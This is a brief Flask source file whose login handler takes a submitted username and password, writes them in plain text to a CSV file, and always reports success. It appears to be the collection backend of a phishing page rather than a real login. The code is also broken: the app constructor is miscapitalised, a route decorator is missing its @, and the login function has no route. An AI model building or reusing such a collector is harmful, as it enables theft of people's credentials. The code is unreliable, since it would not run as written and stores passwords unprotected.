from flask import Flask, redirect, url_for, request, render_template, jsonify
import csv

app = flask(__name__) 

app.route("/")
def index():
    return render_template("/index.html")

def login():
    userName = request.json.get("userName")    
    password = request.json.get("password")
    with open("credes.csv", "a+") as f:
        csv_writer = csv.writer(f)
        csv_writer.writerow([userName, password])

    return jsonify({
        "status": "success"
    }), 201

if __name__ == "__main__":
    app.run(debug = True)
